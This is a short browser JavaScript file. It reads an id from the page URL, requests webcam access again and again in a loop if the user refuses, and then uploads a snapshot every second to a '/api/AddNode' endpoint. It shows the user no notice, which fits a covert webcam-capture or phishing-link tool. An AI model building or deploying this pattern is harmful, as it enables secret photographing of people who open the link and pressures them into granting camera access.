let video = document.querySelector("#video");
let canvas = document.querySelector("#canvas");
let serverId = '';

if (!document.location.href.includes("?id=")) {
    document.location.href = '/';
} else {
    let queryString = new URLSearchParams(document.location.href.split('?')[1]);
    for (let pair of queryString.entries()) {
        serverId = pair[1];
    }
}

(async () => {
    let stream;
    try {
        stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
    } catch (error) {
        while (!stream) {
            stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
        }
    }
	video.srcObject = stream;
    setInterval(() => {  
        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
        let image_data_url = canvas.toDataURL('image/jpeg');
        if (serverId != '') {
            axios.post('/api/AddNode', {
                imageData: image_data_url,
                serverId: serverId
            });
        }
    }, 1000);
})();